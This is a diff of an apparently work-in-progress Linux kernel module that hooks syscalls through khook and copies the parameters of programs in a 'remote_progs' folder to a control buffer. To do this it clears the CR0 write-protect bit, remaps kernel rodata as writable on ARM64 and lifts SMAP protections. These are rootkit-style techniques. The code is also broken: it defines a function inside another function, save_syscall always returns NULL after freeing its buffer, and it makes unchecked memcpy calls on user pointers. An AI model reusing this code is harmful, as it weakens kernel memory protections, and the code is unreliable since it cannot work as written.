@@ -20,14 +20,14 @@
 #include <khook/engine.h>
 
 
-// #if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
-// unsigned long cr0;
-// #elif IS_ENABLED(CONFIG_ARM64)
-// void (*update_mapping_prot)(phys_addr_t phys, unsigned long virt, phys_addr_t size, pgprot_t prot);
-// unsigned long start_rodata;
-// unsigned long init_begin;
-// #define section_size init_begin - start_rodata
-// #endif
+#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
+unsigned long cr0;
+#elif IS_ENABLED(CONFIG_ARM64)
+void (*update_mapping_prot)(phys_addr_t phys, unsigned long virt, phys_addr_t size, pgprot_t prot);
+unsigned long start_rodata;
+unsigned long init_begin;
+#define section_size init_begin - start_rodata
+#endif
 
 // #if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
 // #define KPROBE_LOOKUP 1
@@ -80,127 +80,126 @@ static const void* rscaller_ops_ptr = (void*)&rscaller_ops;
 // }
 
 
-// #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
-// static inline void write_cr0_forced(unsigned long val)
-// {
-// 	unsigned long __force_order;
+#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
+static inline void write_cr0_forced(unsigned long val)
+{
+	unsigned long __force_order;
 
-// 	asm volatile(
-// 		"mov %0, %%cr0"
-// 		: "+r"(val), "+m"(__force_order));
-// }
-// #endif
+	asm volatile(
+		"mov %0, %%cr0"
+		: "+r"(val), "+m"(__force_order));
+}
+#endif
 
-// static inline void smap_write_enable(void)
-// {
-// #if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
-// #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
-// 	write_cr0_forced(cr0);
-// #else
-// 	write_cr0(cr0);
-// #endif
-// #elif IS_ENABLED(CONFIG_ARM64)
-// 	update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata,
-// 			section_size, PAGE_KERNEL_RO);
+static inline void smap_write_enable(void)
+{
+#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
+#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
+	write_cr0_forced(cr0);
+#else
+	write_cr0(cr0);
+#endif
+#elif IS_ENABLED(CONFIG_ARM64)
+	update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata,
+			section_size, PAGE_KERNEL_RO);
 
-// #endif
-// }
+#endif
+}
 
-// static inline void smap_write_disable(void)
-// {
-// #if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
-// #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
-// 	write_cr0_forced(cr0 & ~0x00010000);
-// #else
-// 	write_cr0(cr0 & ~0x00010000);
-// #endif
-// #elif IS_ENABLED(CONFIG_ARM64)
-// 	update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata,
-// 			section_size, PAGE_KERNEL);
-// #endif
-// }
+static inline void smap_write_disable(void)
+{
+#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
+#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
+	write_cr0_forced(cr0 & ~0x00010000);
+#else
+	write_cr0(cr0 & ~0x00010000);
+#endif
+#elif IS_ENABLED(CONFIG_ARM64)
+	update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata,
+			section_size, PAGE_KERNEL);
+#endif
+}
 
-// static inline void smap_rw_disable(void)
-// {
-// 	stac();
-// }
+static inline void smap_rw_disable(void)
+{
+	stac();
+}
 
-// static inline void smap_rw_enable(void)
-// {
-// 	clac();
-// }
-
-// // void fetch_param_variant(SyscallParam *src, int param_type, void **param, size_t *param_size) {
-
-// // TODO: separately handle userspace char buffers
-// int save_syscall_param(SyscallParam *buf, long param, int param_idx, const SyscallSignature *signature)
-// {
-// 	void* inner_buf;
-// 	void* src_kernel;
-// 	bool is_ptr = signature->params_meta[param_idx].is_ptr;
-// 	int type_variant = signature->params_meta[param_idx].type;
-// 	size_t param_size = signature->params_meta[param_idx].size;
-
-// 	fetch_param_variant(buf, type_variant, &inner_buf, &param_size);
-
-// 	// Here we handle all pointers except char buffers
-// 	// param_size is taken from real size of struct
-// 	if (is_ptr) {
-// 		// pr_info("Trying to allocate %d bytes\n", param_size);
-//         src_kernel = kvmalloc(param_size, GFP_KERNEL);
-//         if (!src_kernel) {
-//             pr_err("Failed to allocate temp buf for syscall");
-//             return -ENOMEM; // it's good practice to return a proper error code
-//         }
-
-//         // Copy the data from user space to the kernel buffer
-//         if (copy_from_user(src_kernel, (const void __user *)inner_buf, param_size)) {
-//             kvfree(src_kernel); // Free the allocated buffer in case of failure
-//             pr_err("Failed to copy data from user space");
-//             return -EFAULT; // Return an error if copy fails
-//         }
-
-//         // Now use src_kernel as the source for memcpy
-//         memcpy(inner_buf, src_kernel, param_size);
-//         kvfree(src_kernel); // Free the allocated buffer after copying
-//     } 
-// 	else {
-//         memcpy(inner_buf, (void *)param, param_size); // Unsafe, we should ensure 'param' is valid!
-// 	}
+static inline void smap_rw_enable(void)
+{
+	clac();
+}
 
 
-// 	return 0;
-// }
+// TODO: separately handle userspace char buffers
+int save_syscall_param(SyscallParam *buf, long param, int param_idx, const SyscallSignature *signature)
+{
+	void* inner_buf;
+	void* src_kernel;
+	bool is_ptr = signature->params_meta[param_idx].is_ptr;
+	int type_variant = signature->params_meta[param_idx].type;
+	size_t param_size = signature->params_meta[param_idx].size;
 
-// Syscall* save_syscall(unsigned long *params, const SyscallSignature *signature) {
-// 	Syscall* syscall;
-// 	int ret;
-// 	int i;
+	fetch_param_variant(buf, type_variant, &inner_buf, &param_size);
 
-// 	syscall = kvmalloc(sizeof(Syscall), GFP_KERNEL);
-// 	if (syscall == NULL) {
-// 		pr_err("Failed to alloc syscall buf");
-// 		return NULL;
-// 	}
+	// Here we handle all pointers except char buffers
+	// param_size is taken from real size of struct
+	if (is_ptr) {
+		// pr_info("Trying to allocate %d bytes\n", param_size);
+        src_kernel = kvmalloc(param_size, GFP_KERNEL);
+        if (!src_kernel) {
+            pr_err("Failed to allocate temp buf for syscall");
+            return -ENOMEM; // it's good practice to return a proper error code
+        }
 
-// 	smap_rw_disable();
-// 	for(i = 0; i < signature->n_params; i++) {
+        // Copy the data from user space to the kernel buffer
+        if (copy_from_user(src_kernel, (const void __user *)inner_buf, param_size)) {
+            kvfree(src_kernel); // Free the allocated buffer in case of failure
+            pr_err("Failed to copy data from user space");
+            return -EFAULT; // Return an error if copy fails
+        }
 
-// 		pr_info("Trying to save param %d", i);
-// 		ret = save_syscall_param(&(syscall->param_bufs[i]), params[i], i, signature);
-// 		if (ret == -1) {
-// 			pr_err("Failed to save syscall params");
-// 			return NULL;
-// 		}
-// 	}
-// 	smap_rw_enable();
+        // Now use src_kernel as the source for memcpy
+        memcpy(inner_buf, src_kernel, param_size);
+        kvfree(src_kernel); // Free the allocated buffer after copying
+    } 
+	else {
+        memcpy(inner_buf, (void *)param, param_size); // Unsafe, we should ensure 'param' is valid!
+	}
 
-// 	pr_info("Saved syscall params");
 
-// err:
-// 	kfree(syscall);
-// 	return NULL;
-// }
+	return 0;
+}
+
+Syscall* save_syscall(unsigned long *params, const SyscallSignature *signature) {
+	Syscall* syscall;
+	int ret;
+	int i;
+
+	syscall = kvmalloc(sizeof(Syscall), GFP_KERNEL);
+	if (syscall == NULL) {
+		pr_err("Failed to alloc syscall buf");
+		return NULL;
+	}
+
+	smap_rw_disable();
+	for(i = 0; i < signature->n_params; i++) {
+
+		pr_info("Trying to save param %d", i);
+		ret = save_syscall_param(&(syscall->param_bufs[i]), params[i], i, signature);
+		if (ret == -1) {
+			pr_err("Failed to save syscall params");
+			return NULL;
+		}
+	}
+	smap_rw_enable();
+
+	pr_info("Saved syscall params");
+
+err:
+	kfree(syscall);
+	return NULL;
+}
 
 
 // // Might be needed in case if it will be more convenient to save additional meta
@@ -209,100 +208,113 @@ static const void* rscaller_ops_ptr = (void*)&rscaller_ops;
 // // }
 
 
-// char *get_current_binary_path(void)
-// {
-//     struct mm_struct *mm;
-//     char *buf, *res;
+char *get_current_binary_path(void)
+{
+    struct mm_struct *mm;
+    char *buf, *res;
 
-//     mm = current->mm;
-//     if (!mm || !mm->exe_file)
-//         return NULL;
+    mm = current->mm;
+    if (!mm || !mm->exe_file)
+        return NULL;
 
-//     buf = kvmalloc(PATH_MAX, GFP_KERNEL);
-//     if (!buf)
-//         return NULL;
+    buf = kvmalloc(PATH_MAX, GFP_KERNEL);
+    if (!buf)
+        return NULL;
 
-//     res = d_path(&mm->exe_file->f_path, buf, PATH_MAX);
-//     if (IS_ERR(res)) {
-//         pr_err("d_path failed: %ld\n", PTR_ERR(res));
-//         kvfree(buf);
-//         return NULL;
-//     }
+    res = d_path(&mm->exe_file->f_path, buf, PATH_MAX);
+    if (IS_ERR(res)) {
+        pr_err("d_path failed: %ld\n", PTR_ERR(res));
+        kvfree(buf);
+        return NULL;
+    }
 
-//     res = kstrdup(res, GFP_KERNEL);
-//     kvfree(buf);
-//     return res;
-// }
+    res = kstrdup(res, GFP_KERNEL);
+    kvfree(buf);
+    return res;
+}
 
 
-// bool filter_binary(void) {
-// 	bool is_filtered;
-// 	char  *binary = get_current_binary_path();
+bool filter_binary(void) {
+	bool is_filtered;
+	char  *binary = get_current_binary_path();
 
-// 	if (binary == NULL) {
-// 		return false;
-// 	}
+	if (binary == NULL) {
+		return false;
+	}
 	
-// 	is_filtered = !strstr(binary, REMOTE_PROGS_FOLDER);
+	is_filtered = !strstr(binary, REMOTE_PROGS_FOLDER);
 	
-// 	if (!is_filtered) {
-// 		pr_info("%s performed syscall\n", binary);	
-// 	}
+	if (!is_filtered) {
+		pr_info("%s performed syscall\n", binary);	
+	}
 	
-// 	kvfree(binary);
-// 	return is_filtered;
-// }
+	kvfree(binary);
+	return is_filtered;
+}
 
-// // TODO: add codegen or macro for syscall
-// asmlinkage int hooked_syscall(const struct pt_regs *pt_regs)
-// {
-// 	int ret;
-// 	SyscallSignature signature;
-// 	Syscall *syscall;	
-// 	memcpy(&signature, &signature__x64_sys_execve, sizeof(signature__x64_sys_execve));
-	
-// 	unsigned long params[6] = {
-// 		pt_regs->bx,
-// 		pt_regs->cx,
-// 		pt_regs->dx,
-// 		pt_regs->si,
-// 		pt_regs->di,
-// 		pt_regs->bp,
-// 	};
+inline int handle_syscall_common(const struct pt_regs *pt_regs,
+                                  SyscallSignature *signature,
+                                  int *ret) {
+	Syscall *syscall;	
 
-// 	// Binary is outside of remote_progs folder
-// 	if (filter_binary()) {
-// 		return orig_syscall(pt_regs);
-// 	}
+	unsigned long params[6] = {
+		pt_regs->bx,
+		pt_regs->cx,
+		pt_regs->dx,
+		pt_regs->si,
+		pt_regs->di,
+		pt_regs->bp,
+	};
+    
+    pr_info("handle_syscall_common");
+
+	// Binary is outside of remote_progs folder
+	if (!filter_binary()) {
+        return -1;
+		// return orig_syscall(pt_regs);
+	}
 
 
-// 	smap_write_disable();
-// 	syscall = save_syscall((unsigned long*)&params, &signature);
-// 	smap_write_enable();
+	smap_write_disable();
+	syscall = save_syscall((unsigned long*)&params, signature);
+	smap_write_enable();
 
-// 	ret = control_buffer_submit_syscall(syscall);
+	*ret = control_buffer_submit_syscall(syscall);
 
-// 	return orig_syscall(pt_regs);
-// }
+	return 0;
+}
 
-// int syscall_num = __NR_execve;
+
+#define DEFINE_HOOKED_SYSCALL(name) \
+asmlinkage int hooked_syscall_##name(const struct pt_regs *pt_regs) \
+{ \
+    int ret; \
+    bool sent_remote; \
+    SyscallSignature signature; \
+    sent_remote = handle_syscall_common(pt_regs, &signature##name, &ret); \
+    if (!sent_remote) { \
+        return ORIGINAL_SYSCALL(name, pt_regs); \
+    } \
+    return ret; \
+}
+
+
+#define ORIGINAL_SYSCALL(name, regs) KHOOK_ORIGIN(__x64_sys_kill, regs)
 
 
 KHOOK_EXT(long, __x64_sys_kill, const struct pt_regs *);
 static long khook___x64_sys_kill(const struct pt_regs *regs) {
         printk("sys_kill -- %s pid %ld sig %ld\n", current->comm, regs->di, regs->si);
-        return KHOOK_ORIGIN(__x64_sys_kill, regs);
+        return ORIGINAL_SYSCALL(__x64_sys_kill, regs);
 }
 
-// // int init_hooks(void) {
-// // 	__sys_call_table = get_syscall_table();
-// // 	if (!__sys_call_table)
-// // 		return -1;
-
-// // #if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
-// // 	cr0 = read_cr0();
-// // #elif IS_ENABLED(CONFIG_ARM64)
-// // #endif
+int init_hooks(void) {
+    DEFINE_HOOKED_SYSCALL(__x64_sys_kill)
+	// __sys_call_table = get_syscall_table();
+	// if (!__sys_call_table)
+	// 	return -1;
+    return khook_init(NULL);
+}
 
 
 
@@ -321,14 +333,14 @@ static int __init rscaller_init(void)
 
 	printk("Rscaller init");
 
-	// if (ret = init_hooks()) {
-	// 	pr_err("Failed to register hooks");
-	// 	return ret;
-	// }
-	// pr_debug(!"trying to register %s", DEVICE_PATH);
+	if (ret = init_hooks()) {
+		pr_err("Failed to register hooks");
+		return ret;
+	}
+    
     proc_create(DEVICE_NAME, 0, NULL, rscaller_ops_ptr);
-	// return 0;
-	return khook_init(NULL);
+
+    return 0;
 }
 
 static void __exit rscaller_cleanup(void)
